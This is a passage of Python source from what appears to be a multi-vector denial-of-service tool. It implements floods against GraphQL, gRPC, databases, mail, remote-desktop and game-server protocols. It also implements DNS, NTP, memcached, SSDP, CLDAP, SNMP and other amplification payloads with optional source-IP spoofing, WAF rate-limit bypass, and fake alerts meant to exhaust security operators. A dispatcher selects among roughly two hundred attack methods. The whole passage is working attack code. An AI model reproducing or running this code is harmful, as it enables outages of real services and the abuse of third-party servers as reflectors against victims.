                    b"\r\nContent-Type: application/json\r\nContent-Length: " +
                    str(len(body)).encode() + b"\r\nConnection: close\r\n\r\n" + body)
        self._send_http_raw("GRAPHQL_ALIAS_BOMB", build)

    def _graphql_introspection_flood(self):
        body = b'{"query":"{__schema{types{name fields{name}}}}"}'
        def build():
            return (b"POST /graphql HTTP/1.1\r\nHost: " + self.target_host.encode() +
                    b"\r\nContent-Type: application/json\r\nContent-Length: " +
                    str(len(body)).encode() + b"\r\nConnection: close\r\n\r\n" + body)
        self._send_http_raw("GRAPHQL_INTROSPECTION_FLOOD", build)

    def _grpc_stream_flood(self):
        if not HAS_H2:
            self._http_flood_sync("GRPC_STREAM_FLOOD"); return
        while not self._stop:
            try:
                sock = self._proxy_tcp_connect(self.target_ip, self.target_port, 5.0)
                cfg = self._h2_client_config()
                conn = h2.connection.H2Connection(config=cfg)
                conn.initiate_connection(); sock.sendall(conn.data_to_send())
                for i in range(100):
                    if self._stop: break
                    sid = conn.get_next_available_stream_id()
                    conn.send_headers(sid, [(':method','POST'),(':path','/grpc.Service/Method'),
                        (':scheme','https'),(':authority',self.target_host),
                        ('content-type','application/grpc'),('te','trailers')], end_stream=False)
                    payload = os.urandom(random.randint(64, 512))
                    conn.send_data(sid, b"\x00" + struct.pack("!I", len(payload)) + payload, end_stream=False)
                    try: sock.sendall(conn.data_to_send())
                    except Exception: break
                    self.stats_lf.add_sent(2, len(payload) + 80)
                    with self.method_lock: self.method_stats["GRPC_STREAM_FLOOD"] += 1
                sock.close()
            except Exception: self.stats_lf.add_failed()
            if not self._rate_allow(): continue

    def _tcp_svc(self, name, port, builder, recv=True):
        while not self._stop:
            s = None
            try:
                s = self._proxy_tcp_connect(self.target_ip, self.target_port or port, 2.0)
                payload = builder()
                if payload: s.send(payload)
                if recv:
                    with suppress(Exception):
                        s.settimeout(1); s.recv(1024)
                self.stats_lf.add_sent(1, len(payload) if payload else 0)
                with self.method_lock: self.method_stats[name] += 1
            except Exception: self.stats_lf.add_failed()
            finally:
                if s:
                    with suppress(Exception): s.close()
            if not self._rate_allow(): continue

    def _redis_flood(self):
        self._tcp_svc("REDIS_FLOOD", 6379,
            lambda: b"*3\r\n$3\r\nSET\r\n$5\r\n" + os.urandom(5) + b"\r\n$5\r\n" + os.urandom(5) + b"\r\n")
    def _mongo_flood(self): self._tcp_svc("MONGO_FLOOD", 27017, lambda: os.urandom(200))
    def _elastic_bomb(self):
        def b():
            body = b'{"query":{"bool":{"should":[{"match_all":{}}]}},"size":10000}'
            return (b"POST /_search HTTP/1.1\r\nHost: " + self.target_host.encode() +
                    b"\r\nContent-Type: application/json\r\nContent-Length: " +
                    str(len(body)).encode() + b"\r\nConnection: close\r\n\r\n" + body)
        self._tcp_svc("ELASTIC_BOMB", 9200, b)
    def _mqtt_flood(self): self._tcp_svc("MQTT_FLOOD", 1883, lambda: b"\x30\x10\x00\x05topic" + os.urandom(10))
    def _mqtt5_auth_flood(self):
        # MQTT5 AUTH packet (type 15)
        self._tcp_svc("MQTT5_AUTH_FLOOD", 1883,
            lambda: b"\xf0\x05\x00\x18\x00" + os.urandom(2))
    def _amqp_flood(self): self._tcp_svc("AMQP_FLOOD", 5672, lambda: b"AMQP\x00\x00\x09\x01")
    def _rdp_flood(self): self._tcp_svc("RDP_FLOOD", 3389, lambda: b"\x03\x00\x00\x13\x0e\xe0\x00\x00\x00\x00\x00\x01\x00\x08\x00\x03\x00\x00\x00")
    def _vnc_flood(self): self._tcp_svc("VNC_FLOOD", 5900, lambda: b"RFB 003.008\n")
    def _smb_flood(self): self._tcp_svc("SMB_FLOOD", 445, lambda: b"\x00\x00\x00\x85\xffSMB\x72" + os.urandom(100))
    def _smtp_flood(self):
        self._tcp_svc("SMTP_FLOOD", 25, lambda: b"EHLO test\r\nMAIL FROM:<a@b.com>\r\nRCPT TO:<c@d.com>\r\nDATA\r\n" + os.urandom(5000) + b"\r\n.\r\n")
    def _imap_flood(self): self._tcp_svc("IMAP_FLOOD", 143, lambda: b"a001 LOGIN test test\r\n")
    def _pop3_flood(self): self._tcp_svc("POP3_FLOOD", 110, lambda: b"USER test\r\nPASS test\r\n")
    def _ftp_flood(self): self._tcp_svc("FTP_FLOOD", 21, lambda: b"USER " + os.urandom(6).hex().encode() + b"\r\n")
    def _telnet_flood(self): self._tcp_svc("TELNET_FLOOD", 23, lambda: b"\xff\xfd\x18\xff\xfd\x20\xff\xfd\x23\xff\xfd\x27")
    def _ssh_flood(self): self._tcp_svc("SSH_FLOOD", 22, lambda: b"SSH-2.0-" + os.urandom(8).hex().encode() + b"\r\n")
    def _rtsp_flood(self): self._tcp_svc("RTSP_FLOOD", 554, lambda: b"DESCRIBE rtsp://x/ RTSP/1.0\r\nCSeq: 1\r\n\r\n")
    def _nfs_flood(self): self._tcp_svc("NFS_FLOOD", 2049, lambda: os.urandom(200))
    def _kerberos_flood(self): self._tcp_svc("KERBEROS_FLOOD", 88, lambda: b"\x00\x00\x00\x0a\x6a\x81\x00\x00\x00\x00")
    def _ard_flood(self): self._tcp_svc("ARD_FLOOD", 3283, lambda: os.urandom(100))

    def _sip_flood(self):
        payload = (f"INVITE sip:{self.target_ip} SIP/2.0\r\n"
                   f"Via: SIP/2.0/UDP {self._rip()}:5060\r\nFrom: <sip:x@x>;tag=x\r\n"
                   f"To: <sip:{self.target_ip}>\r\nCall-ID: {os.urandom(8).hex()}\r\n"
                   f"CSeq: 1 INVITE\r\nContent-Length: 0\r\n\r\n").encode()
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 64 * 1024 * 1024)
        try:
            while not self._stop:
                try:
                    s.sendto(payload, (self.target_ip, 5060))
                    self.stats_lf.add_sent(1, len(payload))
                    with self.method_lock: self.method_stats["SIP_FLOOD"] += 1
                except Exception: self.stats_lf.add_failed()
                if not self._rate_allow(): continue
        finally:
            with suppress(Exception): s.close()

    def _doh_spoof(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 64 * 1024 * 1024)
        try:
            while not self._stop:
                try:
                    body = (b"\x00\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00" +
                            bytes([4]) + os.urandom(4) + b"\x03com\x00\x00\x01\x00\x01")
                    pkt = os.urandom(2) + body
                    s.sendto(pkt, (self.target_ip, self.target_port or 53))
                    self.stats_lf.add_sent(1, len(pkt))
                    with self.method_lock: self.method_stats["DNS_DOH_SPOOF"] += 1
                except Exception: self.stats_lf.add_failed()
                if not self._rate_allow(): continue
        finally:
            with suppress(Exception): s.close()

    def _amp_generic(self, name, port, payload_builder):
        if self.spoof_source and self.raw_udp:
            while not self._stop:
                try:
                    payload = payload_builder()
                    pkt = udp_packet(self.target_ip, self.target_ip, _rand().port(), port, payload)
                    self.raw_udp.sendto(pkt, (self.target_ip, 0))
                    self.stats_lf.add_sent(1, len(pkt))
                    with self.method_lock: self.method_stats[name] += 1
                except Exception: self.stats_lf.add_failed()
                if not self._rate_allow(): continue
        else:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 64 * 1024 * 1024)
            try:
                while not self._stop:
                    try:
                        payload = payload_builder()
                        s.sendto(payload, (self.target_ip, self.target_port or port))
                        self.stats_lf.add_sent(1, len(payload))
                        with self.method_lock: self.method_stats[name] += 1
                    except Exception: self.stats_lf.add_failed()
                    if not self._rate_allow(): continue
            finally:
                with suppress(Exception): s.close()

    def _dns_amp(self):
        self._amp_generic("DNS_AMP", 53, lambda: (
            struct.pack("!H", _rand().next() & 0xffff) + b"\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00" +
            b"".join(bytes([len(p)]) + p.encode() for p in
                     [".".join(random.choices("abcdefghijklmnopqrstuvwxyz", k=50)) for _ in range(10)]) +
            b"\x00\x00\xff\x00\x01"))
    def _dns_query_flood(self):
        self._amp_generic("DNS_QUERY_FLOOD", 53, lambda: (
            struct.pack("!H", _rand().next() & 0xffff) + b"\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00" +
            b"".join(bytes([len(p)]) + p.encode() for p in
                     [".".join(random.choices("abcdefghijklmnopqrstuvwxyz", k=10)) for _ in range(3)]) +
            b"\x00\x00\x01\x00\x01"))
    def _dns_edns0(self):
        def build():
            txid = os.urandom(2)
            header = txid + b"\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01"
            label = os.urandom(4).hex().encode()
            qname = bytes([len(label)]) + label + b"\x03com\x00"
            return header + qname + b"\x00\xff\x00\x01" + \
                   b"\x00" + b"\x00\x29" + b"\x10\x00" + b"\x00\x00\x00\x00" + b"\x00\x00"
        self._amp_generic("DNS_EDNS0", 53, build)
    def _ntp_monlist(self): self._amp_generic("NTP_MONLIST", 123, lambda: b"\x17\x00\x03\x2a" + b"\x00" * 4)
    def _memcached_amp(self):
        self._amp_generic("MEMCACHED_AMP", 11211, lambda: (
            struct.pack("!H", _rand().next() & 0xffff) + b"\x00\x00\x00\x01\x00\x00" +
            f"get {'x' * 40}\r\n".encode()))
    def _ssdp_amp(self):
        payload = (b"M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\n"
                   b'MAN: "ssdp:discover"\r\nMX: 5\r\nST: ssdp:all\r\n\r\n')
        self._amp_generic("SSDP_AMP", 1900, lambda: payload)
    def _cldap_amp(self):
        payload = (b"\x30\x25\x02\x01\x01\x63\x20\x04\x00\x0a\x01\x00\x0a\x01\x00"
                   b"\x02\x01\x00\x02\x01\x00\x01\x01\x00\x87\x0bobjectClass\x30\x00")
        self._amp_generic("CLDAP_AMP", 389, lambda: payload)
    def _ldap_amp(self): self._cldap_amp()
    def _snmp_amp(self):
        payload = (b"\x30\x26\x02\x01\x01\x04\x06public\xa0\x19\x02\x04\x00\x00\x00\x01"
                   b"\x02\x01\x00\x02\x01\x00\x30\x0b\x30\x09\x06\x05\x2b\x06\x01\x02\x01")
        self._amp_generic("SNMP_AMP", 161, lambda: payload)
    def _netbios_amp(self):
        payload = (b"\xab\xcd\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00"
                   b"\x20CKAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x00\x00\x21\x00\x01")
        self._amp_generic("NETBIOS_AMP", 137, lambda: payload)
    def _mdns_amp(self):
        payload = (b"\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00"
                   b"\x09_services\x07_dns-sd\x04_udp\x05local\x00\x00\x0c\x00\x01")
        self._amp_generic("MDNS_AMP", 5353, lambda: payload)
    def _wsd_amp(self):
        payload = (b'<?xml version="1.0"?><soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">'
                   b'<soap:Body><wsd:Probe xmlns:wsd="http://schemas.xmlsoap.org/ws/2005/04/discovery"/>'
                   b'</soap:Body></soap:Envelope>')
        self._amp_generic("WSD_AMP", 3702, lambda: payload)
    def _ripv1_amp(self):
        payload = b"\x01\x01\x00\x00\x00\x02\x00\x00" + socket.inet_aton("0.0.0.0") + b"\x00" * 12
        self._amp_generic("RIPV1_AMP", 520, lambda: payload)
    def _qotd_amp(self): self._amp_generic("QOTD_AMP", 17, lambda: b"quote\r\n")
    def _chargen_amp(self): self._amp_generic("CHARGEN_AMP", 19, lambda: b"\x00")
    def _coap_amp(self): self._amp_generic("COAP_AMP", 5683, lambda: b"\x40\x01\x00\x01")
    def _tftp_amp(self): self._amp_generic("TFTP_AMP", 69, lambda: b"\x00\x01bigfile\x00octet\x00blksize\x006548\x00")
    def _stun_amp(self): self._amp_generic("STUN_AMP", 3478, lambda: b"\x00\x01\x00\x00\x21\x12\xa4\x42" + os.urandom(12))
    def _dtls_amp(self): self._amp_generic("DTLS_AMP", 443, lambda: b"\x16\xfe\xfd" + os.urandom(400))
    def _slp_amp(self):
        payload = (b"\x02\x01\x00\x00\x36\x20\x00\x00\x00\x00\x00\x01\x00\x02\x65\x6e"
                   b"\x00\x00\x00\x15\x73\x65\x72\x76\x69\x63\x65\x3a\x73\x65\x72\x76"
                   b"\x69\x63\x65\x2d\x61\x67\x65\x6e\x74\x00\x00\x00\x00\x00")
        self._amp_generic("SLP_AMP", 427, lambda: payload)
    def _portmap_amp(self):
        payload = (b"\x80\x00\x00\x00\x00\x00\x00\x02\x00\x01\x86\xa0\x00\x00\x00\x02"
                   b"\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                   b"\x00\x00\x00\x00")
        self._amp_generic("PORTMAP_AMP", 111, lambda: payload)
    def _tcp_amp(self):
        if not self.raw_tcp:
            self._tcp_flood(); return
        while not self._stop:
            try:
                pkt = tcp_packet(self._rip(), self.target_ip, self._rport(), self.target_port,
                                 _rand().next(), 0, 0x02)
                self.raw_tcp.sendto(pkt, (self.target_ip, 0))
                self.stats_lf.add_sent(1, len(pkt))
                with self.method_lock: self.method_stats["TCP_AMP"] += 1
            except Exception: self.stats_lf.add_failed()
            if not self._rate_allow(): continue

    def _minecraft(self): self._amp_generic("MINECRAFT", 25565, lambda: b"\xfe\xfd\x09\x12\x34\x56\x78\x00\x00\x00\x00" + os.urandom(50))
    def _minecraft_bot(self): self._amp_generic("MINECRAFT_BOT", 25565, lambda: b"\x10\x00\xff\xff\x0fBot" + os.urandom(20))
    def _fivem(self): self._amp_generic("FIVEM", 30120, lambda: b"\xff\xff\xff\xffgetinfo xxx" + os.urandom(100))
    def _fivem_token(self): self._amp_generic("FIVEM_TOKEN", 30120, lambda: b"\xff\xff\xff\xffgetinfo " + os.urandom(random.randint(8, 32)).hex().encode())
    def _teamspeak(self): self._amp_generic("TEAMSPEAK", 9987, lambda: b"\x00\x01\x00\x00\x00\x00\x00\x00" + os.urandom(500))
    def _steam_query(self): self._amp_generic("STEAM_QUERY", 27015, lambda: b"\xff\xff\xff\xffTSource Engine Query\x00")
    def _vse_query(self): self._amp_generic("VSE_QUERY", 27015, lambda: b"\xff\xff\xff\xffTSource Engine Query\x00")
    def _samp_query(self): self._amp_generic("SAMP_QUERY", 7777, lambda: b"SAMP" + os.urandom(8) + b"\x69")
    def _csgo_query(self): self._amp_generic("CSGO_QUERY", 27015, lambda: b"\xff\xff\xff\xffTSource Engine Query\x00")
    def _quake_query(self): self._amp_generic("QUAKE_QUERY", 27960, lambda: b"\xff\xff\xff\xffgetinfo xxx")
    def _bittorrent_dht(self):
        self._amp_generic("BITTORRENT_DHT", 6881, lambda: b"d1:ad2:id20:" + os.urandom(20) + b"e1:q4:ping1:t2:aa1:y1:qe")
    def _kad_attack(self):
        self._amp_generic("KAD_ATTACK", 4672, lambda: b"\xe4\x17" + os.urandom(16) +
                          socket.inet_aton("0.0.0.0") + struct.pack(">H", 0) + struct.pack(">H", 0) + b"\x00")
    def _emule_flood(self): self._amp_generic("EMULE_FLOOD", 4665, lambda: b"\xe3" + os.urandom(100))
    def _gnutella_flood(self): self._tcp_svc("GNUTELLA_FLOOD", 6346, lambda: b"GNUTELLA CONNECT/0.6\r\n\r\n")
    def _mcpe(self):
        self._amp_generic("MCPE", 19132, lambda: b"\x01" + struct.pack(">Q", int(time.time() * 1000) & 0xFFFFFFFFFFFFFFFF) +
                          b"\x00\xff\xff\x00\xfe\xfe\xfe\xfe\xfd\xfd\xfd\xfd\x12\x34\x56\x78")

    def _waf_rate_limit_bypass(self):
        while not self._stop:
            s = None
            try:
                s = self._proxy_tcp_connect(self.target_ip, self.target_port, 3.0)
                spoof = self._rip()
                headers = HeaderFactory.build(self.target_host, True, spoof)
                head = f"GET /?r={os.urandom(4).hex()} HTTP/1.1\r\n"
                for k, v in headers.items(): head += f"{k}: {v}\r\n"
                head += "Connection: close\r\n\r\n"
                s.send(head.encode())
                with suppress(Exception):
                    s.settimeout(1); s.recv(512)
                self.stats_lf.add_sent(1, len(head))
                with self.method_lock: self.method_stats["WAF_RATE_LIMIT_BYPASS"] += 1
            except Exception: self.stats_lf.add_failed()
            finally:
                if s:
                    with suppress(Exception): s.close()
            if not self._rate_allow(): continue

    def _operator_fatigue(self):
        ALERTS = [("CRITICAL", "SQL Injection"), ("HIGH", "Failed SSH"), ("MEDIUM", "Port scan")]
        ENDPOINTS = ["/api/alerts", "/siem/ingest"]
        while not self._stop:
            s = None
            try:
                s = self._proxy_tcp_connect(self.target_ip, self.target_port, 3.0)
                sev, msg = random.choice(ALERTS)
                ep = random.choice(ENDPOINTS)
                body = json.dumps({"alert": sev, "message": msg}).encode()
                req = (f"POST {ep} HTTP/1.1\r\nHost: {self.target_host}\r\n"
                       f"User-Agent: {self._rua()}\r\nContent-Type: application/json\r\n"
                       f"Content-Length: {len(body)}\r\nX-SOC-Alert: {sev}\r\nConnection: close\r\n\r\n"
                       ).encode() + body
                s.send(req)
                with suppress(Exception):
                    s.settimeout(1); s.recv(512)
                self.stats_lf.add_sent(1, len(req))
                with self.method_lock: self.method_stats["OPERATOR_FATIGUE"] += 1
            except Exception: self.stats_lf.add_failed()
            finally:
                if s:
                    with suppress(Exception): s.close()
            if not self._rate_allow(): continue

    def _run_cve(self, name):
        try:
            loop = asyncio.new_event_loop()
            cve = CVEExploiter(self.target_url, self, self.target_host, self.target_ip, self.target_port)
            loop.run_until_complete(cve.attack())
            loop.close()
        except Exception: pass

    def _run_worker(self, method):
        try:
            m = method
            if m == "HTTP2_RAPID_RESET": self._h2_rapid_reset()
            elif m == "HTTP2_CONTINUATION_FLOOD": self._h2_continuation_flood()
            elif m == "HTTP2_PING_FLOOD": self._h2_ping_flood()
            elif m == "HTTP2_SETTINGS_FLOOD": self._h2_settings_flood()
            elif m == "HTTP2_WINDOW_UPDATE_FLOOD": self._h2_window_update_flood()
            elif m == "HTTP2_HPACK_BOMB": self._h2_hpack_bomb()
            elif m == "HTTP2_STREAM_MULTIPLEX": self._h2_stream_multiplex()
            elif m == "HTTP2_PRIORITY_FLOOD": self._h2_priority_flood()
            elif m == "HTTP2_GOAWAY_FLOOD": self._h2_goaway_flood()
            elif m == "HTTP2_PUSH_PROMISE_FLOOD": self._h2_push_promise_flood()
            elif m == "HTTP2_RST_STREAM_SPAM": self._h2_rst_stream_spam()
            elif m == "HTTP2_MADE_YOU_RESET": self._h2_made_you_reset()
            elif m == "HTTP2_SPCA": self._h2_spca()
            elif m == "HTTP2_BOMB": self._h2_bomb()
            elif m == "HTTP2_SMUGGLING": self._h2_smuggling()
            elif m == "HTTP2_GRPC_CHURN": self._h2_grpc_churn()
            elif m == "HTTP2_PADDING_FLOOD": self._h2_padding_flood()
            elif m == "HTTP2_DATA_PADDING": self._h2_data_padding()
            elif m == "HTTP2_WINDOW_ZERO": self._h2_window_zero()
            elif m == "HTTP2_STREAM_EXHAUST": self._h2_stream_exhaust()
            elif m == "HTTP2_HEADERS_SPLIT": self._h2_headers_split()
            elif m == "HTTP3_QUIC_FLOOD": self._http3_quic_flood()
            elif m == "HTTP3_QUIC_HANDSHAKE_FLOOD": self._http3_quic_flood()
            elif m == "HTTP3_QUIC_VERSION_NEG": self._http3_quic_flood()
            elif m == "HTTP3_QPACK_EXPANSION": self._http3_qpack_bomb()
            elif m == "HTTP3_SMUGGLING": self._http3_quic_flood()
            elif m == "HTTP3_CACHE_POISONING": self._http3_quic_flood()
            elif m == "HTTP3_CDN_TSUNAMI": self._http3_quic_flood()
            elif m == "HTTP3_QUICLORIS": self._http3_quic_flood()
            elif m == "HTTP3_RETRY_LOOP": self._http3_retry_loop()
            elif m == "HTTP3_0RTT_FLOOD": self._http3_0rtt_flood()
            elif m == "HTTP3_CONNECTION_CLOSE_FLOOD": self._http3_connection_close_flood()
            elif m == "HTTP3_STREAM_RESET_FLOOD": self._http3_stream_reset_flood()
            elif m == "HTTP3_QPACK_ENCODER_STALL": self._http3_qpack_encoder_stall()
            elif m == "TLS_CLIENT_HELLO_FLOOD": self._tls_hello_flood()
            elif m == "TLS_RENEGOTIATION": self._tls_reneg()
            elif m == "TLS_JA3_RANDOMIZED": self._tls_ja3_randomized()
            elif m == "TLS_JA4_RANDOMIZED": self._tls_ja4_randomized()
            elif m == "SNI_FLOOD": self._sni_flood()
            elif m == "SNI_SPOOF": self._sni_spoof()
            elif m == "TLS_HEARTBLEED_PROBE": self._tls_heartbleed_probe()
            elif m == "TLS_SESSION_RESUMPTION_FLOOD": self._tls_session_resumption()
            elif m == "TLS_CERTIFICATE_BOMB": self._tls_certificate_bomb()
            elif m == "TLS_PSK_FLOOD": self._tls_psk_flood()
            elif m == "TLS_KEYSHARE_FLOOD": self._tls_keyshare_flood()
            elif m == "TLS_ECH_FLOOD": self._tls_ech_flood()
            elif m == "TLS_0RTT_FLOOD": self._tls_0rtt_flood()
            elif m == "SYN_FLOOD_V2": self._flag_flood(0x02, "SYN_FLOOD_V2")
            elif m == "UDP_FLOOD_V2": self._udp_flood_v2()
            elif m == "ICMP_FLOOD_V2": self._icmp_flood_v2()
            elif m == "TCP_FLOOD": self._tcp_flood()
            elif m == "ACK_FLOOD": self._ack_flood()
            elif m == "RST_FLOOD": self._rst_flood()
            elif m == "FIN_FLOOD": self._fin_flood()
            elif m == "XMAS_FLOOD": self._xmas_flood()
            elif m == "NULL_FLOOD": self._null_flood()
            elif m == "PSH_FLOOD": self._psh_flood()
            elif m == "URG_FLOOD": self._urg_flood()
            elif m == "SYN_ACK_FLOOD": self._syn_ack_flood()
            elif m == "GRE_FLOOD": self._gre_flood()
            elif m == "ESP_FLOOD": self._esp_flood()
            elif m == "IPIP_FLOOD": self._ipip_flood()
            elif m == "FRAG_FLOOD": self._frag_flood()
            elif m == "LAND_ATTACK": self._land_attack()
            elif m == "SMURF_ATTACK": self._smurf_attack()
            elif m == "FRAGGLE_ATTACK": self._smurf_attack()
            elif m == "TCP_OPTIONS_FLOOD": self._tcp_options_flood()
            elif m == "TCP_MSS_FLOOD": self._tcp_mss_flood()
            elif m == "IP_OPTIONS_FLOOD": self._ip_options_flood()
            elif m == "JUMBO_FRAME_FLOOD": self._jumbo_frame_flood()
            elif m == "TCP_TIMESTAMP_SPOOF": self._tcp_timestamp_spoof()
            elif m == "MAC_SPOOF": self._mac_spoof()
            elif m == "PQC_QUIC_INITIAL": self._pqc_quic_initial()
            elif m == "ICMP_FRAGMENT_FLOOD": self._icmp_fragment_flood()
            elif m == "TCP_URGENT_DATA": self._tcp_urgent_data()
            elif m == "TCP_ZERO_WINDOW": self._tcp_zero_window()
            elif m == "IPSPOOF_SYN": self._ipspoof_syn()
            elif m == "TCP_SACK_ABUSE": self._tcp_sack_abuse()
            elif m == "TCP_FASTOPEN_FLOOD": self._tcp_fastopen_flood()
            elif m == "SCTP_INIT_FLOOD": self._sctp_init_flood()
            elif m == "IPV6_RAW_FLOOD": self._ipv6_raw_flood()
            elif m == "SLOWLORIS_V2": self._submit(self._slowloris_async(asyncio.Semaphore(1)))
            elif m == "SLOW_READ_V2": self._submit(self._slow_read_async(asyncio.Semaphore(1)))
            elif m == "RUDY_V2": self._submit(self._rudy_async(asyncio.Semaphore(1)))
            elif m == "SLOW_HEADERS": self._submit(self._slow_headers_async(asyncio.Semaphore(1)))
            elif m == "SLOW_BODY": self._submit(self._slow_body_async(asyncio.Semaphore(1)))
            elif m == "SLOW_POST": self._submit(self._slow_post_async(asyncio.Semaphore(1)))
            elif m == "APACHE_KILLER_V2": self._apache_killer()
            elif m == "RANGE_HEADER_BOMB": self._range_bomb()
            elif m == "RANGE_AMP": self._range_bomb()
            elif m == "JSON_BOMB": self._json_bomb()
            elif m == "XML_BOMB": self._xml_bomb()
            elif m == "PROTOBUF_BOMB": self._protobuf_bomb()
            elif m == "BROTLI_BOMB": self._brotli_bomb()
            elif m == "REGEX_DOS_REDOS": self._redos()
            elif m == "GRAPHQL_DEPTH_BOMB": self._graphql_depth_bomb()
            elif m == "GRAPHQL_ALIAS_BOMB": self._graphql_alias_bomb()
            elif m == "GRAPHQL_INTROSPECTION_FLOOD": self._graphql_introspection_flood()
            elif m == "GRPC_STREAM_FLOOD": self._grpc_stream_flood()
            elif m == "GRPC_WEB_TEXT_BOMB": self._submit(self._grpc_web_text_bomb_async(asyncio.Semaphore(1)))
            elif m == "HTTP_SMUGGLING_CLTE": self._smuggle_clte()
            elif m == "HTTP_SMUGGLING_TECL": self._smuggle_tecl()
            elif m == "HTTP_SMUGGLING_TE_TE": self._smuggle_te_te()
            elif m == "HOST_HEADER_INJECTION": self._host_header_injection()
            elif m == "REQUEST_SMUGGLING_CHUNK": self._request_smuggling_chunk()
            elif m == "CF_BYPASS": self._cf_bypass()
            elif m == "CACHE_BYPASS": self._cache_bypass()
            elif m == "CACHE_POISONING": self._cache_poisoning()
            elif m == "WAF_CHALLENGE_BYPASS": self._cf_bypass()
            elif m == "WAF_RATE_LIMIT_BYPASS": self._waf_rate_limit_bypass()
            elif m == "WAF_IP_ROTATION": self._waf_rate_limit_bypass()
            elif m == "OPERATOR_FATIGUE": self._operator_fatigue()
            elif m == "WEBSOCKET_FRAME_FLOOD":
                self._submit(self._ws_frame_flood_async(asyncio.Semaphore(1)))
            elif m == "WEBSOCKET_PING_FLOOD":
                self._submit(self._ws_frame_flood_async(asyncio.Semaphore(1)))
            elif m == "WEBSOCKET_DEFLATE_BOMB":
                self._submit(self._ws_zip_bomb_async(asyncio.Semaphore(1)))
            elif m == "WEBSOCKET_MASK_FLOOD":
                self._submit(self._ws_frame_flood_async(asyncio.Semaphore(1)))
            elif m == "WEBSOCKET_ZIP_BOMB":
                self._submit(self._ws_zip_bomb_async(asyncio.Semaphore(1)))
            elif m == "DNS_AMP": self._dns_amp()
            elif m == "DNS_QUERY_FLOOD": self._dns_query_flood()
            elif m == "DNS_EDNS0": self._dns_edns0()
            elif m == "DNS_DOH_SPOOF": self._doh_spoof()
            elif m == "NTP_MONLIST": self._ntp_monlist()
            elif m == "MEMCACHED_AMP": self._memcached_amp()
            elif m == "SSDP_AMP": self._ssdp_amp()
            elif m == "CLDAP_AMP": self._cldap_amp()
            elif m == "LDAP_AMP": self._ldap_amp()
            elif m == "SNMP_AMP": self._snmp_amp()
            elif m == "NETBIOS_AMP": self._netbios_amp()
            elif m == "MDNS_AMP": self._mdns_amp()
            elif m == "WSD_AMP": self._wsd_amp()
            elif m == "RIPV1_AMP": self._ripv1_amp()
            elif m == "QOTD_AMP": self._qotd_amp()
            elif m == "CHARGEN_AMP": self._chargen_amp()
            elif m == "COAP_AMP": self._coap_amp()
            elif m == "TFTP_AMP": self._tftp_amp()
            elif m == "STUN_AMP": self._stun_amp()
            elif m == "DTLS_AMP": self._dtls_amp()
            elif m == "SLP_AMP": self._slp_amp()
            elif m == "PORTMAP_AMP": self._portmap_amp()
            elif m == "TCP_AMP": self._tcp_amp()
            elif m == "REDIS_FLOOD": self._redis_flood()
            elif m == "MONGO_FLOOD": self._mongo_flood()
            elif m == "ELASTIC_BOMB": self._elastic_bomb()
            elif m == "MQTT_FLOOD": self._mqtt_flood()
            elif m == "MQTT5_AUTH_FLOOD": self._mqtt5_auth_flood()
            elif m == "AMQP_FLOOD": self._amqp_flood()
            elif m == "RDP_FLOOD": self._rdp_flood()
            elif m == "VNC_FLOOD": self._vnc_flood()
            elif m == "SMB_FLOOD": self._smb_flood()
            elif m == "SMTP_FLOOD": self._smtp_flood()
            elif m == "IMAP_FLOOD": self._imap_flood()
            elif m == "POP3_FLOOD": self._pop3_flood()
            elif m == "FTP_FLOOD": self._ftp_flood()
            elif m == "TELNET_FLOOD": self._telnet_flood()
            elif m == "SSH_FLOOD": self._ssh_flood()
            elif m == "SIP_FLOOD": self._sip_flood()
            elif m == "RTSP_FLOOD": self._rtsp_flood()
            elif m == "NFS_FLOOD": self._nfs_flood()
            elif m == "KERBEROS_FLOOD": self._kerberos_flood()
            elif m == "ARD_FLOOD": self._ard_flood()
            elif m == "MINECRAFT": self._minecraft()
            elif m == "MINECRAFT_BOT": self._minecraft_bot()
            elif m == "FIVEM": self._fivem()
            elif m == "FIVEM_TOKEN": self._fivem_token()
            elif m == "TEAMSPEAK": self._teamspeak()
            elif m == "STEAM_QUERY": self._steam_query()
            elif m == "VSE_QUERY": self._vse_query()
            elif m == "SAMP_QUERY": self._samp_query()
            elif m == "CSGO_QUERY": self._csgo_query()
            elif m == "QUAKE_QUERY": self._quake_query()
            elif m == "BITTORRENT_DHT": self._bittorrent_dht()
            elif m == "KAD_ATTACK": self._kad_attack()
            elif m == "EMULE_FLOOD": self._emule_flood()
            elif m == "GNUTELLA_FLOOD": self._gnutella_flood()
            elif m == "MCPE": self._mcpe()
            elif m.startswith("CVE_"): self._run_cve(m)
            elif m == "INFINITY_MIX":
                cycle = itertools.cycle([x for x in ALL_METHOD_NAMES if x != "INFINITY_MIX"])
                while not self._stop:
                    try: self._run_worker(next(cycle))
                    except Exception: pass
            else: self._http_flood_sync(m)
        except (KeyboardInterrupt, SystemExit): raise
        except Exception as e: logger.debug(f"Worker error: {e}")

    async def _async_worker(self, method, sem):
        try:
            m = method
            if m == "HTTP_FLOOD": await self._http_flood_async(sem)
            elif m == "SLOWLORIS_V2": await self._slowloris_async(sem)
            elif m == "SLOW_READ_V2": await self._slow_read_async(sem)
            elif m == "RUDY_V2": await self._rudy_async(sem)
            elif m == "SLOW_HEADERS": await self._slow_headers_async(sem)
            elif m == "SLOW_BODY": await self._slow_body_async(sem)
            elif m == "SLOW_POST": await self._slow_post_async(sem)
            elif m == "GRPC_WEB_TEXT_BOMB": await self._grpc_web_text_bomb_async(sem)
            elif m.startswith("WEBSOCKET_"):
                if m == "WEBSOCKET_ZIP_BOMB" or m == "WEBSOCKET_DEFLATE_BOMB":
                    await self._ws_zip_bomb_async(sem)
                else:
